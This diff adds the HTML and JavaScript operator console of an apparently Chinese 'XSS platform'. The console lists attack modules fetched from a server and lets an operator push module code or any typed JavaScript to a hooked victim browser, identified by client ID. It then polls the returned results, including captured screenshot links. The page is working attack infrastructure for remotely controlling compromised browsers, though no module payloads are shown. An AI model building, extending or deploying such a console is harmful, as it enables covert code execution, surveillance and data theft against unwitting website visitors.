@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS 平台 - 客户端管理</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            min-height: 100vh;
+            color: #333;
+        }
+
+        .header {
+            background: white;
+            padding: 1rem 2rem;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header h1 {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #4a6cf7;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .header h1::before {
+            content: "⚙️";
+            font-size: 1.2rem;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        .section {
+            background: white;
+            border-radius: 10px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
+        }
+
+        .section h2 {
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 1.5rem;
+            padding-bottom: 1rem;
+            border-bottom: 1px solid #f0f0f0;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .category-section {
+            margin-bottom: 1.5rem;
+        }
+        
+        .category-title {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: #4a6cf7;
+            margin-bottom: 0.8rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 1px dashed #e0e4e8;
+        }
+        
+        .modules-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 1rem;
+            margin-bottom: 1rem;
+        }
+
+        .module-btn {
+            padding: 1rem;
+            background: #f0f2f5;
+            border: 1px solid #e0e4e8;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            font-weight: 500;
+            color: #4a6cf7;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-align: center;
+        }
+
+        .module-btn:hover {
+            background: #e0e4e8;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
+        }
+
+        .code-editor {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .code-editor textarea {
+            width: 100%;
+            height: 150px;
+            padding: 1rem;
+            border: 1px solid #e0e4e8;
+            border-radius: 6px;
+            background: #f9f9f9;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            resize: vertical;
+        }
+
+        .code-editor textarea:focus {
+            outline: none;
+            border-color: #4a6cf7;
+            box-shadow: 0 0 5px rgba(74, 108, 247, 0.2);
+            background: white;
+        }
+
+        .btn {
+            padding: 0.5rem 1rem;
+            border: none;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .btn-primary {
+            background: #4a6cf7;
+            color: white;
+            align-self: flex-end;
+        }
+
+        .btn-primary:hover {
+            background: #3a5ce5;
+            transform: translateY(-1px);
+        }
+
+        .btn-secondary {
+            background: #f0f2f5;
+            color: #4a6cf7;
+            border: 1px solid #e0e4e8;
+        }
+
+        .btn-secondary:hover {
+            background: #e0e4e8;
+        }
+
+        .results-container {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .result-item {
+            background: #f9f9f9;
+            border-radius: 6px;
+            padding: 1rem;
+            border-left: 4px solid #4a6cf7;
+        }
+
+        .result-item.error {
+            border-left-color: #ff6b6b;
+        }
+
+        .result-item.pending {
+            border-left-color: #ffc107;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.7; }
+            50% { opacity: 1; }
+            100% { opacity: 0.7; }
+        }
+
+        .result-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 0.5rem;
+            font-size: 0.8rem;
+            color: #888;
+        }
+
+        .result-content {
+            font-size: 0.9rem;
+        }
+
+        .result-content pre {
+            white-space: pre-wrap;
+            word-break: break-all;
+            background: #f0f2f5;
+            padding: 0.5rem;
+            border-radius: 4px;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+
+        .error {
+            color: #ff6b6b;
+        }
+
+        .pending {
+            color: #ffc107;
+        }
+
+        .no-results {
+            text-align: center;
+            padding: 2rem;
+            color: #888;
+            background: #f9f9f9;
+            border-radius: 6px;
+            border: 1px dashed #e0e4e8;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 1rem;
+            }
+            
+            .modules-grid {
+                grid-template-columns: 1fr 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>客户端管理</h1>
+        <button class="btn btn-secondary" onclick="window.close()">关闭</button>
+    </div>
+
+    <div class="container">
+        <div class="client-detail">
+            <div class="section">
+                <h2>📦 功能模块</h2>
+                <div id="modulesGrid">
+                    <!-- 分类和模块按钮将动态生成 -->
+                </div>
+            </div>
+
+            <div class="section">
+                <h2>💻 自定义代码执行</h2>
+                <div class="code-editor">
+                    <textarea id="customCode" placeholder="输入要执行的 JavaScript 代码...">// 示例代码
+document.title</textarea>
+                    <button onclick="executeCustomCode()" class="btn btn-primary">执行代码</button>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2>📋 执行结果</h2>
+                <div class="results-container" id="resultsContainer">
+                    <!-- 结果将在这里显示 -->
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const clientId = window.location.pathname.split('/').pop();
+        let results = [];
+        let modules = {};
+        let modulesData = {};
+
+        // 页面加载时初始化
+        document.addEventListener('DOMContentLoaded', () => {
+            loadModules();
+            loadResults();
+            setInterval(loadResults, 2000); // 每2秒刷新结果
+        });
+
+        // 加载模块配置
+        async function loadModules() {
+            try {
+                const response = await fetch('/api/modules');
+                const data = await response.json();
+                modulesData = data; // 保存完整的模块数据，包括分类
+                modules = data.modules;
+                window.modulesData = data; // 全局保存，供其他函数使用
+                
+                // 对于每个模块，如果有file属性，则通过API加载对应的代码
+                for (const moduleId in modules) {
+                    try {
+                        const moduleResponse = await fetch('/api/module/' + moduleId);
+                        const moduleCode = await moduleResponse.text();
+                        modules[moduleId].code = moduleCode;
+                    } catch (moduleError) {
+                        console.error(`Failed to load module code for ${moduleId}:`, moduleError);
+                        modules[moduleId].code = `// 模块加载失败: ${moduleError.message}`;
+                    }
+                }
+                
+                renderModules();
+            } catch (error) {
+                console.error('Failed to load modules:', error);
+                document.getElementById('modulesGrid').innerHTML = '<div class="error">模块加载失败</div>';
+            }
+        }
+
+        // 渲染模块按钮
+        function renderModules() {
+            const grid = document.getElementById('modulesGrid');
+            
+            // 获取分类信息
+            let categories = {};
+            if (window.modulesData && window.modulesData.categories) {
+                categories = window.modulesData.categories;
+            }
+            
+            // 按分类组织模块
+            const modulesByCategory = {};
+            
+            // 初始化分类
+            Object.keys(categories).forEach(categoryId => {
+                modulesByCategory[categoryId] = [];
+            });
+            
+            // 将模块分配到对应分类
+            Object.keys(modules).forEach(moduleId => {
+                const module = modules[moduleId];
+                const categoryId = module.category || 'common_tools'; // 默认分类
+                
+                if (!modulesByCategory[categoryId]) {
+                    modulesByCategory[categoryId] = [];
+                }
+                
+                modulesByCategory[categoryId].push({
+                    id: moduleId,
+                    name: module.name,
+                    description: module.description
+                });
+            });
+            
+            // 生成HTML
+            let html = '';
+            
+            Object.keys(categories).forEach(categoryId => {
+                const categoryModules = modulesByCategory[categoryId] || [];
+                if (categoryModules.length > 0) {
+                    html += `
+                        <div class="category-section">
+                            <div class="category-title">${categories[categoryId].name}</div>
+                            <div class="modules-grid">
+                                ${categoryModules.map(module => 
+                                    `<button class="module-btn" onclick="executeModule('${module.id}')" title="${module.description}">
+                                        ${module.name}
+                                    </button>`
+                                ).join('')}
+                            </div>
+                        </div>
+                    `;
+                }
+            });
+            
+            grid.innerHTML = html || '<div class="error">没有可用模块</div>';
+        }
+
+        // 执行模块
+        async function executeModule(moduleId) {
+            try {
+                if (!modules[moduleId]) {
+                    alert('模块不存在: ' + moduleId);
+                    return;
+                }
+
+                const moduleCode = modules[moduleId].code;
+                
+                const response = await fetch('/api/client/' + clientId + '/execute', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        type: 'module',
+                        module: moduleId,
+                        code: moduleCode
+                    })
+                });
+
+                const data = await response.json();
+                if (data.taskId) {
+                    addPendingResult(data.taskId, '执行模块: ' + modules[moduleId].name);
+                }
+            } catch (error) {
+                alert('执行失败: ' + error.message);
+            }
+        }
+
+        // 执行自定义代码
+        async function executeCustomCode() {
+            const code = document.getElementById('customCode').value.trim();
+            if (!code) {
+                alert('请输入要执行的代码');
+                return;
+            }
+
+            try {
+                const response = await fetch('/api/client/' + clientId + '/execute', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        type: 'custom',
+                        code: code
+                    })
+                });
+
+                const data = await response.json();
+                if (data.taskId) {
+                    addPendingResult(data.taskId, '自定义代码');
+                }
+            } catch (error) {
+                alert('执行失败: ' + error.message);
+            }
+        }
+
+        // 加载执行结果
+        async function loadResults() {
+            try {
+                const response = await fetch('/api/client/' + clientId + '/results');
+                results = await response.json();
+                renderResults();
+            } catch (error) {
+                console.error('Failed to load results:', error);
+            }
+        }
+
+        // 渲染结果
+        // 渲染结果
+        function renderResults() {
+            const container = document.getElementById('resultsContainer');
+            
+            if (results.length === 0) {
+                container.innerHTML = '<div class="no-results">暂无执行结果</div>';
+                return;
+            }
+
+            container.innerHTML = results.slice(-10).reverse().map(result => {
+                // 处理结果内容，检查是否包含截图URL
+                let resultContent = '';
+                if (result.error) {
+                    resultContent = '<div class="error">错误: ' + result.error + '</div>';
+                } else {
+                    // 检查结果是否包含截图URL
+                    if (result.result && result.result.includes('截图已保存:')) {
+                        // 提取URL
+                        const urlMatch = result.result.match(/访问地址: (http:\/\/[^\n]+)/);
+                        if (urlMatch && urlMatch[1]) {
+                            const screenshotUrl = urlMatch[1];
+                            // 替换URL为可点击的链接
+                            resultContent = '<pre>' + 
+                                result.result.replace(
+                                    /访问地址: (http:\/\/[^\n]+)/, 
+                                    '访问地址: <a href="' + screenshotUrl + '" target="_blank">' + screenshotUrl + '</a>'
+                                ) + 
+                            '</pre>';
+                        } else {
+                            resultContent = '<pre>' + result.result + '</pre>';
+                        }
+                    } else {
+                        resultContent = '<pre>' + result.result + '</pre>';
+                    }
+                }
+                
+                return '<div class="result-item ' + (result.error ? 'error' : 'success') + '">' +
+                    '<div class="result-header">' +
+                        '<span class="result-time">' + new Date(result.time).toLocaleString() + '</span>' +
+                        '<span class="result-task">' + result.taskId + '</span>' +
+                    '</div>' +
+                    '<div class="result-content">' + resultContent + '</div>' +
+                '</div>';
+            }).join('');
+        }
+
+        // 添加待处理结果
+        function addPendingResult(taskId, description) {
+            const container = document.getElementById('resultsContainer');
+            const pendingDiv = document.createElement('div');
+            pendingDiv.className = 'result-item pending';
+            pendingDiv.innerHTML = 
+                '<div class="result-header">' +
+                    '<span class="result-time">' + new Date().toLocaleString() + '</span>' +
+                    '<span class="result-task">' + taskId + '</span>' +
+                '</div>' +
+                '<div class="result-content">' +
+                    '<div class="pending">执行中: ' + description + '...</div>' +
+                '</div>';
+            container.insertBefore(pendingDiv, container.firstChild);
+        }
+    </script>
+</body>
+</html>
